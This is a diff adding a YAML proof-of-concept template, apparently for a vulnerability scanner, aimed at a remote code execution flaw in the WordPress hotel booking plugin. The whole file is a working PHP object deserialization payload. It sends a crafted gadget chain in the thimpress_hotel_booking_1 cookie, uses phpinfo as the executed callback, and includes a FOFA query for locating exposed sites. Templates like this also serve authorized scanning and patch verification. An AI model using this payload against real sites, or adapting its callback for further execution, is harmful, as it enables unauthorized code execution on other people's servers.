@@ -1,0 +1,22 @@
+id: poc-yaml-wordpress-thimpress-hotel-booking-rce
+info:
+  name: WordPress thimpress_hotel_booking 代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: hotel_booking
+  fofa: body="wp-content/plugins/wp-hotel-booking"
+requests:
+- method: GET
+  path: /
+  headers:
+    Cookie: thimpress_hotel_booking_1=O:11:"WPHB_Logger":1:{s:21:"%00WPHB_Logger%00_handles"%3BC:33:"Requests_Utility_FilteredIterator":67:{x:i:0%3Ba:1:{i:0%3Bs:2:"-1"%3B}%3Bm:a:1:{s:11:"%00*%00callback"%3Bs:6:""%3B}}}
+  expression: status_code == 200 && !contains(body,"phpinfo()")
+- method: GET
+  path: /
+  headers:
+    Cookie: thimpress_hotel_booking_1=O:11:"WPHB_Logger":1:{s:21:"%00WPHB_Logger%00_handles"%3BC:33:"Requests_Utility_FilteredIterator":67:{x:i:0%3Ba:1:{i:0%3Bs:2:"-1"%3B}%3Bm:a:1:{s:11:"%00*%00callback"%3Bs:7:"phpinfo"%3B}}}
+  expression: status_code == 200 && contains(body,"PHP Version") && contains(body,"PHP
+    API") && contains(body,"phpinfo()")
+variables: {}
+transport: http
